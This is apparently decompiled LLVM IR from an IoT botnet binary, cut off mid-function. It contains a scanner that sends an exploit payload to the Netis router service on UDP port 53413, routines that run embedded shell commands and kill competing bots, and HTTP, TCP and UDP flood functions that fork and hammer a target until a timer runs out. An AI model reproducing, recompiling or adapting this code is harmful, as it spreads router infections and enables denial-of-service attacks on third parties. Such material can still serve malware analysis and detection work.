define i32 @StartTheNetis(i32 %arg1) local_unnamed_addr {
entry:
  %stack_var_-1076 = alloca i32, align 4
  %stack_var_-44 = alloca i32, align 4
  %stack_var_-52 = alloca i32, align 4
  %stack_var_-4 = alloca i32, align 4
  store i32 63528, i32* %stack_var_-4, align 4
  %v2_f824 = ptrtoint i32* %stack_var_-4 to i32
  store i32 %v2_f824, i32* @fp, align 4
  %v2_f888 = bitcast i32* %stack_var_-44 to i8*
  %v2_f89c = ptrtoint i32* %stack_var_-1076 to i32
  %tmp17 = bitcast i32* %stack_var_-1076 to i8*
  %v2_f8c8 = ptrtoint i32* %stack_var_-52 to i32
  br label %dec_label_pc_f82c

dec_label_pc_f82c:                                ; preds = %dec_label_pc_f82c, %entry
  %v3_f838 = call i32 @socket(i32 2, i32 2, i32 0)
  %v0_f844 = call i32 @NetisRanges()
  store i32 2, i32* %stack_var_-52, align 4
  %v1_f860 = call i32 @__GI_htons(i32 53413)
  store i32 8, i32* @r2, align 4
  %v3_f888 = call i32 @__GI_memset(i8* %v2_f888, i32 0)
  store i32 %v2_f89c, i32* @r0, align 4
  %v3_f8ac = call i32 @sprintf(i32 %v2_f89c, i32 ptrtoint ([711 x i8]* @global_var_20c7c.538 to i32))
  %v3_f8c0 = call i32 @strlen(i8* %tmp17)
  %v6_f8f4 = call i32 @__libc_sendto(i32 %v3_f838, i32 %v2_f89c, i32 %v3_f8c0, i32 0, i32 %v2_f8c8, i32 16)
  br label %dec_label_pc_f82c

; uselistorder directives
  uselistorder i32 %v2_f89c, { 0, 2, 1 }
  uselistorder i32* %stack_var_-4, { 1, 0 }
}

define i32 @LoopPayload(i32 %arg1) local_unnamed_addr {
entry:
  %v2_f92c = call i32 @__libc_system(i32 ptrtoint ([704 x i8]* @global_var_20f4c.542 to i32))
  ret i32 %v2_f92c
}

define i32 @botkiller(i32 %arg1) local_unnamed_addr {
entry:
  %tmp12 = call i32 @__decompiler_undefined_function_0()
  %stack_var_-2188 = alloca i32, align 4
  %stack_var_-24 = alloca i32, align 4
  %stack_var_-2316 = alloca i32, align 4
  %stack_var_-2028 = alloca i32, align 4
  %stack_var_-1064 = alloca i32, align 4
  %stack_var_-44 = alloca i8*, align 4
  %stack_var_-4 = alloca i32, align 4
  %v3_f950 = load i32, i32* @r4, align 4
  %v6_f950 = load i32, i32* @fp, align 4
  %v13_f950 = load i32, i32* @lr, align 4
  store i32 63832, i32* %stack_var_-4, align 4
  %v2_f954 = ptrtoint i32* %stack_var_-4 to i32
  store i32 %v2_f954, i32* @fp, align 4
  %v21_f978 = ptrtoint i8** %stack_var_-44 to i32
  store i32 %v21_f978, i32* @lr, align 4
  store i8* getelementptr inbounds ([6 x i8], [6 x i8]* @global_var_22bb8.552, i32 0, i32 0), i8** %stack_var_-44, align 4
  store i32 ptrtoint ([247 x i8*]* @global_var_2278c.804 to i32), i32* @r3, align 4
  %v2_f98c = ptrtoint i32* %stack_var_-1064 to i32
  store i32 988, i32* @ip, align 4
  store i32 %v2_f98c, i32* @r0, align 4
  store i32 ptrtoint ([247 x i8*]* @global_var_2278c.804 to i32), i32* @r1, align 4
  store i32 988, i32* @r2, align 4
  %v0_f9a0 = call i32 @memcpy()
  %v2_f9b0 = ptrtoint i32* %stack_var_-2028 to i32
  store i32 %v2_f9b0, i32* @r3, align 4
  store i32 964, i32* @ip, align 4
  store i32 %v2_f9b0, i32* @r0, align 4
  store i32 ptrtoint ([241 x i8*]* @global_var_21b68.1032 to i32), i32* @r1, align 4
  store i32 964, i32* @r2, align 4
  %v0_f9c4 = call i32 @memcpy()
  %v6_f9dc = icmp sgt i32 %tmp12, 0
  br i1 %v6_f9dc, label %dec_label_pc_f9e0, label %dec_label_pc_fbac

dec_label_pc_f9e0:                                ; preds = %entry
  %v2_f9e8 = ptrtoint i32* %stack_var_-2316 to i32
  store i32 128, i32* @r2, align 4
  %v2_f9f8 = bitcast i32* %stack_var_-2316 to i8*
  %v3_f9f8 = call i32 @__GI_memset(i8* %v2_f9f8, i32 0)
  %v2_fa14 = ptrtoint i32* %stack_var_-24 to i32
  %v2_fa1c = add i32 %v2_fa14, -52
  %v1_fa20 = inttoptr i32 %v2_fa1c to i32*
  %v2_fa20 = load i32, i32* %v1_fa20, align 4
  store i32 %v2_fa20, i32* @lr, align 4
  store i32 %v2_fa14, i32* @r4, align 4
  store i32 %v2_f9e8, i32* @r0, align 4
  store i32 127, i32* @r1, align 4
  %v7_fac4 = call i32 @__GI_snprintf(i32 %v2_f9e8, i32 127, i32 ptrtoint ([100 x i8]* @global_var_22be8.1034 to i32), i32 %v2_fa20, i32 %v2_fa20, i32 %v2_fa20)
  %v1_fb58 = call i32 @__libc_system(i32 %v2_f9e8)
  store i32 %v2_fa14, i32* @lr, align 4
  %v2_fb84 = ptrtoint i32* %stack_var_-2188 to i32
  store i32 %v2_fb84, i32* @r0, align 4
  %v3_fb90 = call i32 @sprintf(i32 %v2_fb84, i32 ptrtoint ([14 x i8]* @global_var_22c6c.1038 to i32))
  %v1_fba4 = call i32 @__libc_system(i32 %v2_fb84)
  br label %dec_label_pc_fbb4

dec_label_pc_fbac:                                ; preds = %entry
  %v1_fbb0 = call i32 @sleep(i32 5)
  br label %dec_label_pc_fbb4

dec_label_pc_fbb4:                                ; preds = %dec_label_pc_f9e0, %dec_label_pc_fbac
  %storemerge10 = phi i32 [ %v1_fbb0, %dec_label_pc_fbac ], [ %v1_fba4, %dec_label_pc_f9e0 ]
  store i32 %v3_f950, i32* @r4, align 4
  store i32 %v6_f950, i32* @fp, align 4
  store i32 %v13_f950, i32* @lr, align 4
  ret i32 %storemerge10

; uselistorder directives
  uselistorder i32 %v2_fb84, { 0, 2, 1 }
  uselistorder i32 %v2_fa20, { 1, 2, 3, 0 }
  uselistorder i32 %v2_fa14, { 1, 2, 0 }
  uselistorder i32 %v2_f9e8, { 0, 2, 1 }
  uselistorder i32* %stack_var_-4, { 1, 0 }
  uselistorder i8** %stack_var_-44, { 1, 0 }
  uselistorder i32 55, { 1, 0 }
  uselistorder i32 51, { 0, 1, 2, 8, 3, 4, 5, 6, 7 }
  uselistorder label %dec_label_pc_fbb4, { 1, 0 }
}

define i32 @RemoveTMP(i32 %arg1) local_unnamed_addr {
entry:
  %v2_fbe8 = call i32 @__libc_system(i32 ptrtoint ([43 x i8]* @global_var_22c7c.1041 to i32))
  %v2_fbf0 = call i32 @__libc_system(i32 ptrtoint ([21 x i8]* @global_var_22ca8.1043 to i32))
  %v2_fbf8 = call i32 @__libc_system(i32 ptrtoint ([22 x i8]* @global_var_22cc0.1045 to i32))
  %v2_fc00 = call i32 @__libc_system(i32 ptrtoint ([21 x i8]* @global_var_22ca8.1043 to i32))
  %v2_fc08 = call i32 @__libc_system(i32 ptrtoint ([14 x i8]* @global_var_22cd8.1047 to i32))
  %v2_fc10 = call i32 @__libc_system(i32 ptrtoint ([11 x i8]* @global_var_22ce8.1049 to i32))
  %v2_fc18 = call i32 @__libc_system(i32 ptrtoint ([23 x i8]* @global_var_22cf4.1051 to i32))
  %v2_fc20 = call i32 @__libc_system(i32 ptrtoint ([20 x i8]* @global_var_22d0c.1053 to i32))
  %v2_fc28 = call i32 @__libc_system(i32 ptrtoint ([11 x i8]* @global_var_22d20.1055 to i32))
  %v2_fc30 = call i32 @__libc_system(i32 ptrtoint ([17 x i8]* @global_var_22d2c.1057 to i32))
  %v2_fc38 = call i32 @__libc_system(i32 ptrtoint ([14 x i8]* @global_var_22d40.1059 to i32))
  %v2_fc40 = call i32 @__libc_system(i32 ptrtoint ([22 x i8]* @global_var_22d50.1061 to i32))
  %v2_fc48 = call i32 @__libc_system(i32 ptrtoint ([36 x i8]* @global_var_22d68.1063 to i32))
  ret i32 %v2_fc48

; uselistorder directives
  uselistorder i32 (i32)* @__libc_system, { 15, 14, 13, 12, 11, 10, 9, 8, 7, 6, 5, 4, 3, 2, 1, 0 }
}

define i32 @socket_connect(i32 %arg1, i16 %arg2) local_unnamed_addr {
entry:
  %stack_var_-44 = alloca i32, align 4
  %stack_var_-36 = alloca i32, align 4
  %stack_var_-40 = alloca i32, align 4
  %stack_var_-4 = alloca i32, align 4
  %v3_fc8c = load i32, i32* @fp, align 4
  store i32 64660, i32* %stack_var_-4, align 4
  %v2_fc90 = ptrtoint i32* %stack_var_-4 to i32
  store i32 %v2_fc90, i32* @fp, align 4
  store i32 1, i32* %stack_var_-44, align 4
  store i32 %arg1, i32* @r0, align 4
  %v1_fcb0 = call i32 @__GI_gethostbyname(i32 %arg1)
  %v2_fcc0 = icmp eq i32 %v1_fcb0, 0
  br i1 %v2_fcc0, label %dec_label_pc_fcc8, label %dec_label_pc_fcd4

dec_label_pc_fcc8:                                ; preds = %entry
  br label %dec_label_pc_fda0

dec_label_pc_fcd4:                                ; preds = %entry
  %tmp = sext i16 %arg2 to i32
  %v1_fcd8 = add i32 %v1_fcb0, 16
  %v2_fcd8 = inttoptr i32 %v1_fcd8 to i32*
  %v3_fcd8 = load i32, i32* %v2_fcd8, align 4
  %v1_fcdc = inttoptr i32 %v3_fcd8 to i32*
  %v2_fcdc = load i32, i32* %v1_fcdc, align 4
  %v1_fce4 = add i32 %v1_fcb0, 12
  %v2_fce4 = inttoptr i32 %v1_fce4 to i32*
  %v3_fce4 = load i32, i32* %v2_fce4, align 4
  store i32 %v3_fce4, i32* @r2, align 4
  %v2_fcf0 = ptrtoint i32* %stack_var_-36 to i32
  store i32 %v2_fcf0, i32* @r3, align 4
  %v5_fcfc = call i32 @bcopy(i32 %v2_fcdc, i32 %v2_fcf0, i32 %v3_fce4, i32 %v2_fcf0, i32 %v1_fcb0)
  %v2_fd08 = call i32 @__GI_htons(i32 %tmp)
  store i32 2, i32* %stack_var_-40, align 4
  %v3_fd28 = call i32 @socket(i32 2, i32 1, i32 6)
  %v2_fd34 = ptrtoint i32* %stack_var_-44 to i32
  %v5_fd50 = call i32 @__GI_setsockopt(i32 %v3_fd28, i32 6, i32 1, i32 %v2_fd34, i32 4)
  %v3_fd58 = icmp eq i32 %v3_fd28, -1
  br i1 %v3_fd58, label %dec_label_pc_fd60, label %dec_label_pc_fd6c

dec_label_pc_fd60:                                ; preds = %dec_label_pc_fcd4
  br label %dec_label_pc_fda0

dec_label_pc_fd6c:                                ; preds = %dec_label_pc_fcd4
  %v2_fcec = ptrtoint i32* %stack_var_-40 to i32
  %v3_fd7c = call i32 @__libc_connect(i32 %v3_fd28, i32 %v2_fcec, i32 16)
  %v3_fd84 = icmp eq i32 %v3_fd7c, -1
  br i1 %v3_fd84, label %dec_label_pc_fd8c, label %dec_label_pc_fd98

dec_label_pc_fd8c:                                ; preds = %dec_label_pc_fd6c
  br label %dec_label_pc_fda0

dec_label_pc_fd98:                                ; preds = %dec_label_pc_fd6c
  br label %dec_label_pc_fda0

dec_label_pc_fda0:                                ; preds = %dec_label_pc_fd8c, %dec_label_pc_fd60, %dec_label_pc_fcc8, %dec_label_pc_fd98
  %stack_var_-60.0 = phi i32 [ 0, %dec_label_pc_fcc8 ], [ 0, %dec_label_pc_fd60 ], [ 0, %dec_label_pc_fd8c ], [ %v3_fd28, %dec_label_pc_fd98 ]
  store i32 %v3_fc8c, i32* @fp, align 4
  ret i32 %stack_var_-60.0

; uselistorder directives
  uselistorder i32* %stack_var_-4, { 1, 0 }
  uselistorder i32* %stack_var_-40, { 1, 0 }
  uselistorder i32* %stack_var_-44, { 1, 0 }
  uselistorder label %dec_label_pc_fda0, { 3, 0, 1, 2 }
}

define i32 @sendHTTP(i32 %arg1, i32 %arg2, i16 %arg3, i32 %arg4, i32 %arg5, i32 %arg6) local_unnamed_addr {
entry:
  %stack_var_-808 = alloca i32, align 4
  %stack_var_-284 = alloca i32, align 4
  %stack_var_-24 = alloca i32, align 4
  %stack_var_-4 = alloca i32, align 4
  %stack_var_0 = alloca i32, align 4
  store i32 %arg5, i32* %stack_var_0, align 4
  store i32 64960, i32* %stack_var_-4, align 4
  %v2_fdbc = ptrtoint i32* %stack_var_-4 to i32
  store i32 %v2_fdbc, i32* @fp, align 4
  %v2_fdd8 = ptrtoint i32* %stack_var_-24 to i32
  store i32 ptrtoint ([62 x i8*]* @global_var_24114.1127 to i32), i32* @r3, align 4
  %v2_fde4 = ptrtoint i32* %stack_var_-284 to i32
  store i32 248, i32* @ip, align 4
  store i32 %v2_fde4, i32* @r0, align 4
  store i32 ptrtoint ([62 x i8*]* @global_var_24114.1127 to i32), i32* @r1, align 4
  store i32 248, i32* @r2, align 4
  %v0_fdf8 = call i32 @memcpy()
  %v2_fe10 = call i32 @__GI_time(i32* null)
  %v3_fe18 = load i32, i32* %stack_var_0, align 4
  %v2_fe1c = add i32 %v3_fe18, %v2_fe10
  %v0_fe24 = call i32 @rand()
  %v2_fe38 = srem i32 %v0_fe24, 3
  %v3_fe64 = mul nsw i32 %v2_fe38, 4
  %v2_fe6c = add i32 %v3_fe64, %v2_fdd8
  %v2_fe70 = add i32 %v2_fe6c, -272
  %v1_fe74 = inttoptr i32 %v2_fe70 to i32*
  %v2_fe74 = load i32, i32* %v1_fe74, align 4
  store i32 %v2_fe74, i32* @r4, align 4
  %v0_fe78 = call i32 @rand()
  %v2_fed8 = ptrtoint i32* %stack_var_-808 to i32
  store i32 %v2_fed8, i32* @r0, align 4
  %v3_fef4 = call i32 @sprintf(i32 %v2_fed8, i32 ptrtoint ([62 x i8]* @global_var_2420c.1137 to i32))
  store i32 %v3_fef4, i32* @r0, align 4
  %tmp30 = bitcast i32* %stack_var_-808 to i8*
  %v5_ffac37 = icmp sgt i32 %arg6, 0
  br i1 %v5_ffac37, label %dec_label_pc_ff04, label %dec_label_pc_ffb0

dec_label_pc_ff04:                                ; preds = %entry, %dec_label_pc_ff94
  %storemerge138 = phi i32 [ %v1_ff98, %dec_label_pc_ff94 ], [ 0, %entry ]
  %v0_ff04 = call i32 @__libc_fork()
  store i32 %v0_ff04, i32* @r0, align 4
  %v2_ff0c = icmp eq i32 %v0_ff04, 0
  br i1 %v2_ff0c, label %dec_label_pc_ff94, label %dec_label_pc_ff74

dec_label_pc_ff18:                                ; preds = %dec_label_pc_ff74
  %v4_ff34 = call i32 @socket_connect(i32 %arg1, i16 %arg3)
  %v2_ff44 = icmp eq i32 %v4_ff34, 0
  br i1 %v2_ff44, label %dec_label_pc_ff74, label %dec_label_pc_ff4c

dec_label_pc_ff4c:                                ; preds = %dec_label_pc_ff18
  %v3_ff54 = call i32 @strlen(i8* %tmp30)
  %v2_ff68 = call i32 @__GI_write(i32 %v4_ff34, i32 %v2_fed8)
  %v1_ff70 = call i32 @__GI_close(i32 %v4_ff34)
  br label %dec_label_pc_ff74

dec_label_pc_ff74:                                ; preds = %dec_label_pc_ff18, %dec_label_pc_ff4c, %dec_label_pc_ff04
  %v2_ff78 = call i32 @__GI_time(i32* null)
  %v5_ff88 = icmp slt i32 %v2_ff78, %v2_fe1c
  br i1 %v5_ff88, label %dec_label_pc_ff18, label %dec_label_pc_ff8c

dec_label_pc_ff8c:                                ; preds = %dec_label_pc_ff74
  %v1_ff90 = call i32 @__GI__exit(i32 1)
  store i32 %v1_ff90, i32* @r0, align 4
  br label %dec_label_pc_ff94

dec_label_pc_ff94:                                ; preds = %dec_label_pc_ff04, %dec_label_pc_ff8c
  %v1_ffb83 = phi i32 [ 0, %dec_label_pc_ff04 ], [ %v1_ff90, %dec_label_pc_ff8c ]
  %v1_ff98 = add nuw nsw i32 %storemerge138, 1
  %v5_ffac = icmp slt i32 %v1_ff98, %arg6
  br i1 %v5_ffac, label %dec_label_pc_ff04, label %dec_label_pc_ffb0

dec_label_pc_ffb0:                                ; preds = %dec_label_pc_ff94, %entry
  %v1_ffb8.lcssa = phi i32 [ %v3_fef4, %entry ], [ %v1_ffb83, %dec_label_pc_ff94 ]
  ret i32 %v1_ffb8.lcssa

; uselistorder directives
  uselistorder i32 %v1_ff98, { 1, 0 }
  uselistorder i32 %v4_ff34, { 1, 0, 2 }
  uselistorder i32 %v2_fed8, { 1, 0, 2 }
  uselistorder i32* %stack_var_0, { 1, 0 }
  uselistorder i32* %stack_var_-4, { 1, 0 }
  uselistorder i32 %arg6, { 1, 0 }
  uselistorder label %dec_label_pc_ff94, { 1, 0 }
  uselistorder label %dec_label_pc_ff74, { 1, 0, 2 }
  uselistorder label %dec_label_pc_ff04, { 1, 0 }
}

define i32 @sendSTD(i32 %arg1, i32 %arg2, i32 %arg3) local_unnamed_addr {
entry:
  %stack_var_-196 = alloca i32, align 4
  %stack_var_-48 = alloca i32, align 4
  %stack_var_-52 = alloca i32, align 4
  %stack_var_-4 = alloca i32, align 4
  %stack_var_-16 = alloca i32, align 4
  %v3_ffd0 = load i32, i32* @fp, align 4
  store i32 %v3_ffd0, i32* %stack_var_-16, align 4
  store i32 65496, i32* %stack_var_-4, align 4
  %v13_ffd0 = ptrtoint i32* %stack_var_-16 to i32
  %v2_ffd4 = ptrtoint i32* %stack_var_-4 to i32
  store i32 %v2_ffd4, i32* @fp, align 4
  %v3_fff4 = call i32 @socket(i32 2, i32 2, i32 0)
  %v2_10004 = call i32 @__GI_time(i32* null)
  store i32 %arg1, i32* @r0, align 4
  %v1_10018 = call i32 @__GI_gethostbyname(i32 %arg1)
  %v2_10024 = ptrtoint i32* %stack_var_-52 to i32
  store i32 %v2_10024, i32* @r0, align 4
  %v2_10030 = call i32 @bzero(i32 %v2_10024, i32 16)
  %v1_10038 = add i32 %v1_10018, 16
  %v2_10038 = inttoptr i32 %v1_10038 to i32*
  %v3_10038 = load i32, i32* %v2_10038, align 4
  %v1_1003c = inttoptr i32 %v3_10038 to i32*
  %v2_1003c = load i32, i32* %v1_1003c, align 4
  %v1_10044 = add i32 %v1_10018, 12
  %v2_10044 = inttoptr i32 %v1_10044 to i32*
  %v3_10044 = load i32, i32* %v2_10044, align 4
  store i32 %v3_10044, i32* @r2, align 4
  %v2_10050 = ptrtoint i32* %stack_var_-48 to i32
  store i32 %v2_10050, i32* @r3, align 4
  %v5_1005c = call i32 @bcopy(i32 %v2_1003c, i32 %v2_10050, i32 %v3_10044, i32 %v2_10050, i32 ptrtoint (i32* @0 to i32))
  %v1_10064 = add i32 %v1_10018, 8
  %v2_10064 = inttoptr i32 %v1_10064 to i32*
  %v3_10064 = load i32, i32* %v2_10064, align 4
  %v3_1006c = urem i32 %v3_10064, 65536
  store i32 %v3_1006c, i32* %stack_var_-52, align 4
  %v2_10090 = ptrtoint i32* %stack_var_-196 to i32
  %v2_10144 = add i32 %v2_10004, %arg3
  %v2_100ec = add i32 %v13_ffd0, -180
  br label %dec_label_pc_1008c

dec_label_pc_1008c:                               ; preds = %dec_label_pc_10168, %entry
  %storemerge7 = phi i32 [ 0, %entry ], [ %v1_1016c, %dec_label_pc_10168 ]
  store i32 ptrtoint ([36 x i8*]* @global_var_24408.1175 to i32), i32* @r3, align 4
  store i32 144, i32* @ip, align 4
  store i32 %v2_10090, i32* @r0, align 4
  store i32 ptrtoint ([36 x i8*]* @global_var_24408.1175 to i32), i32* @r1, align 4
  store i32 144, i32* @r2, align 4
  %v0_100a4 = call i32 @memcpy()
  %v0_100a8 = call i32 @rand()
  %v1_100b8 = zext i32 %v0_100a8 to i64
  %v4_100b8 = mul nuw nsw i64 %v1_100b8, 954437177
  %v3_100bc1 = udiv i64 %v4_100b8, 34359738368
  %tmp = icmp ult i32 %storemerge7, 50
  br i1 %tmp, label %dec_label_pc_10168, label %dec_label_pc_10108

dec_label_pc_10108:                               ; preds = %dec_label_pc_1008c
  %v3_100c83 = mul nuw nsw i64 %v3_100bc1, 4
  %v3_100c8 = trunc i64 %v3_100c83 to i32
  %v2_100d0.neg = sub i32 %v0_100a8, %v3_100c8
  %v3_100cc5 = mul nuw nsw i64 %v3_100bc1, 32
  %v3_100cc = trunc i64 %v3_100cc5 to i32
  %v2_100d4 = sub i32 %v2_100d0.neg, %v3_100cc
  %v3_100e4 = mul i32 %v2_100d4, 4
  %v2_100f0 = add i32 %v2_100ec, %v3_100e4
  %v1_100f4 = inttoptr i32 %v2_100f0 to i32*
  %v2_100f4 = load i32, i32* %v1_100f4, align 4
  %v5_10118 = call i32 @__libc_send(i32 %v3_fff4, i32 %v2_100f4, i32 75, i32 0)
  %v3_1012c = call i32 @__libc_connect(i32 %v3_fff4, i32 %v2_10024, i32 16)
  %v2_10134 = call i32 @__GI_time(i32* null)
  %v5_1014c = icmp slt i32 %v2_10134, %v2_10144
  br i1 %v5_1014c, label %dec_label_pc_10160, label %dec_label_pc_10150

dec_label_pc_10150:                               ; preds = %dec_label_pc_10108
  %v1_10154 = call i32 @__GI_close(i32 %v3_fff4)
  %v1_1015c = call i32 @__GI__exit(i32 0)
  br label %dec_label_pc_10160

dec_label_pc_10160:                               ; preds = %dec_label_pc_10108, %dec_label_pc_10150
  br label %dec_label_pc_10168

dec_label_pc_10168:                               ; preds = %dec_label_pc_1008c, %dec_label_pc_10160
  %stack_var_-24.0 = phi i32 [ %storemerge7, %dec_label_pc_1008c ], [ 0, %dec_label_pc_10160 ]
  %v1_1016c = add i32 %stack_var_-24.0, 1
  br label %dec_label_pc_1008c

; uselistorder directives
  uselistorder i32 %storemerge7, { 1, 0 }
  uselistorder i32 %v2_10024, { 0, 2, 1 }
  uselistorder i32 %v1_10018, { 2, 1, 0 }
  uselistorder i32* %stack_var_-16, { 1, 0 }
  uselistorder i32* %stack_var_-4, { 1, 0 }
  uselistorder i32 50, { 0, 2, 1 }
  uselistorder i32 (i32)* @__GI_gethostbyname, { 1, 2, 0 }
  uselistorder label %dec_label_pc_10168, { 1, 0 }
  uselistorder label %dec_label_pc_10160, { 1, 0 }
}

define i32 @sendUDP(i32 %arg1, i32 %arg2, i32 %arg3, i32 %arg4, i32 %arg5, i32 %arg6) local_unnamed_addr {
entry:
  %r2.global-to-local = alloca i32, align 4
  store i32 %arg3, i32* %r2.global-to-local, align 4
  %stack_var_-84 = alloca i32, align 4
  %stack_var_-72 = alloca i32, align 4
  %stack_var_-76 = alloca i32, align 4
  %stack_var_-80 = alloca i32, align 4
  %stack_var_-4 = alloca i32, align 4
  %stack_var_0 = alloca i32, align 4
  store i32 %arg5, i32* %stack_var_0, align 4
  store i32 65932, i32* %stack_var_-4, align 4
  %v2_10188 = ptrtoint i32* %stack_var_-4 to i32
  store i32 %v2_10188, i32* @fp, align 4
  store i32 2, i32* %stack_var_-80, align 4
  %v2_101ac = icmp eq i32 %arg2, 0
  br i1 %v2_101ac, label %dec_label_pc_101b4, label %dec_label_pc_101cc

dec_label_pc_101b4:                               ; preds = %entry
  %v0_101b4 = call i32 @rand_cmwc()
  br label %dec_label_pc_101e8

dec_label_pc_101cc:                               ; preds = %entry
  %v3_101d4 = urem i32 %arg2, 65536
  %v1_101dc = call i32 @__GI_htons(i32 %v3_101d4)
  br label %dec_label_pc_101e8

dec_label_pc_101e8:                               ; preds = %dec_label_pc_101b4, %dec_label_pc_101cc
  %v3_101f8 = call i32 @getHost(i32 %arg1, i32* nonnull %stack_var_-76)
  %v2_10200 = icmp eq i32 %v3_101f8, 0
  br i1 %v2_10200, label %dec_label_pc_10208, label %dec_label_pc_10748

dec_label_pc_10208:                               ; preds = %dec_label_pc_101e8
  store i32 8, i32* @r2, align 4
  %v2_1021c = bitcast i32* %stack_var_-72 to i8*
  %v3_1021c = call i32 @__GI_memset(i8* %v2_1021c, i32 0)
  store i32 %arg6, i32* %r2.global-to-local, align 4
  %v7_1022c = icmp eq i32 %arg4, 32
  br i1 %v7_1022c, label %dec_label_pc_10234, label %dec_label_pc_10364

dec_label_pc_10234:                               ; preds = %dec_label_pc_10208
  store i32 17, i32* @r2, align 4
  %v3_10240 = call i32 @socket(i32 2, i32 2, i32 17)
  %v2_10250 = icmp eq i32 %v3_10240, 0
  br i1 %v2_10250, label %dec_label_pc_10258, label %dec_label_pc_10270

dec_label_pc_10258:                               ; preds = %dec_label_pc_10234
  %v2_1025c = load i32, i32* @global_var_2e4e0.53, align 4
  %v3_10268 = call i32 @HackerPrint(i32 %v2_1025c, i32 ptrtoint ([27 x i8]* @global_var_24498.1179 to i32))
  br label %dec_label_pc_10748

dec_label_pc_10270:                               ; preds = %dec_label_pc_10234
  %v3_10270 = load i32, i32* %stack_var_0, align 4
  %v1_10274 = add i32 %v3_10270, 1
  %v1_1027c = call i32 @malloc(i32 %v1_10274)
  %v2_1028c = icmp eq i32 %v1_1027c, 0
  br i1 %v2_1028c, label %dec_label_pc_10748, label %dec_label_pc_10294

dec_label_pc_10294:                               ; preds = %dec_label_pc_10270
  %v3_10294 = load i32, i32* %stack_var_0, align 4
  %v1_10298 = add i32 %v3_10294, 1
  store i32 %v1_10298, i32* @r2, align 4
  %v2_102a8 = inttoptr i32 %v1_1027c to i8*
  %v3_102a8 = call i32 @__GI_memset(i8* %v2_102a8, i32 0)
  %v2_102b4 = call i32 @makeRandomStr(i32 %v1_1027c, i32 %v3_10294)
  %v2_102bc = call i32 @__GI_time(i32* null)
  store i32 %v2_102bc, i32* %r2.global-to-local, align 4
  %v2_102c8 = add i32 %v2_102bc, %arg3
  %v2_102dc = ptrtoint i32* %stack_var_-80 to i32
  br label %dec_label_pc_102d8

dec_label_pc_102d8:                               ; preds = %dec_label_pc_10354, %dec_label_pc_10348, %dec_label_pc_10294
  %stack_var_-112.0 = phi i32 [ 0, %dec_label_pc_10294 ], [ 0, %dec_label_pc_10348 ], [ %v1_10358, %dec_label_pc_10354 ]
  %v3_102d8 = load i32, i32* %stack_var_0, align 4
  store i32 %v3_102d8, i32* %r2.global-to-local, align 4
  %v6_102fc = call i32 @__libc_sendto(i32 %v3_10240, i32 %v1_1027c, i32 %v3_102d8, i32 0, i32 %v2_102dc, i32 16)
  store i32 %stack_var_-112.0, i32* %r2.global-to-local, align 4
  %v9_10308 = icmp eq i32 %stack_var_-112.0, %arg6
  br i1 %v9_10308, label %dec_label_pc_10310, label %dec_label_pc_10354

dec_label_pc_10310:                               ; preds = %dec_label_pc_102d8
  br i1 %v2_101ac, label %dec_label_pc_1031c, label %dec_label_pc_10330

dec_label_pc_1031c:                               ; preds = %dec_label_pc_10310
  %v0_1031c = call i32 @rand_cmwc()
  br label %dec_label_pc_10330

dec_label_pc_10330:                               ; preds = %dec_label_pc_10310, %dec_label_pc_1031c
  %v2_10334 = call i32 @__GI_time(i32* null)
  store i32 %v2_10334, i32* %r2.global-to-local, align 4
  %v8_10344 = icmp sgt i32 %v2_10334, %v2_102c8
  br i1 %v8_10344, label %dec_label_pc_10748, label %dec_label_pc_10348

dec_label_pc_10348:                               ; preds = %dec_label_pc_10330
  store i32 0, i32* %r2.global-to-local, align 4
  br label %dec_label_pc_102d8

dec_label_pc_10354:                               ; preds = %dec_label_pc_102d8
  %v1_10358 = add i32 %stack_var_-112.0, 1
  br label %dec_label_pc_102d8

dec_label_pc_10364:                               ; preds = %dec_label_pc_10208
  store i32 17, i32* @r2, align 4
  %v3_10378 = call i32 @socket(i32 2, i32 3, i32 17)
  %v2_10388 = icmp eq i32 %v3_10378, 0
  br i1 %v2_10388, label %dec_label_pc_10390, label %dec_label_pc_103a8

dec_label_pc_10390:                               ; preds = %dec_label_pc_10364
  %v2_10394 = load i32, i32* @global_var_2e4e0.53, align 4
  %v3_103a0 = call i32 @HackerPrint(i32 %v2_10394, i32 ptrtoint ([27 x i8]* @global_var_24498.1179 to i32))
  br label %dec_label_pc_10744

dec_label_pc_103a8:                               ; preds = %dec_label_pc_10364
  store i32 1, i32* %stack_var_-84, align 4
  %v2_103b0 = ptrtoint i32* %stack_var_-84 to i32
  store i32 3, i32* @r2, align 4
  %v5_103cc = call i32 @__GI_setsockopt(i32 %v3_10378, i32 0, i32 3, i32 %v2_103b0, i32 4)
  %v1_103d4 = icmp slt i32 %v5_103cc, 0
  br i1 %v1_103d4, label %dec_label_pc_103dc, label %dec_label_pc_103f4

dec_label_pc_103dc:                               ; preds = %dec_label_pc_103a8
  %v2_103e0 = load i32, i32* @global_var_2e4e0.53, align 4
  %v3_103ec = call i32 @HackerPrint(i32 %v2_103e0, i32 ptrtoint ([33 x i8]* @global_var_244b4.1181 to i32))
  br label %dec_label_pc_10744

dec_label_pc_103f4:                               ; preds = %dec_label_pc_103a8
  br label %dec_label_pc_10400

dec_label_pc_10400:                               ; preds = %dec_label_pc_103f4, %dec_label_pc_10400
  %v1_1043821 = phi i32 [ 49, %dec_label_pc_103f4 ], [ %v1_10438, %dec_label_pc_10400 ]
  %v2_10404 = call i32 @__GI_time(i32* null)
  store i32 %v2_10404, i32* @r4, align 4
  %v0_10410 = call i32 @rand_cmwc()
  %v0_10418 = load i32, i32* @r4, align 4
  %v2_10418 = xor i32 %v0_10418, %v0_10410
  %v1_10420 = call i32 @srand(i32 %v2_10418)
  %v0_10424 = call i32 @rand()
  %v1_10430 = call i32 @init_rand(i32 %v0_10424)
  %v1_10438 = add nsw i32 %v1_1043821, -1
  %v3_10444 = icmp eq i32 %v1_1043821, 0
  br i1 %v3_10444, label %dec_label_pc_1044c, label %dec_label_pc_10400

dec_label_pc_1044c:                               ; preds = %dec_label_pc_10400
  %v2_10450 = icmp eq i32 %arg4, 0
  br i1 %v2_10450, label %dec_label_pc_1047c, label %dec_label_pc_10464

dec_label_pc_10464:                               ; preds = %dec_label_pc_1044c
  %v1_10468 = sub i32 32, %arg4
  store i32 %v1_10468, i32* %r2.global-to-local, align 4
  %v1_10474 = shl i32 -1, %v1_10468
  br label %dec_label_pc_1047c

dec_label_pc_1047c:                               ; preds = %dec_label_pc_1044c, %dec_label_pc_10464
  %storemerge10 = phi i32 [ %v1_10474, %dec_label_pc_10464 ], [ 0, %dec_label_pc_1044c ]
  %v3_1047c = load i32, i32* %stack_var_0, align 4
  %v1_10480 = add i32 %v3_1047c, 28
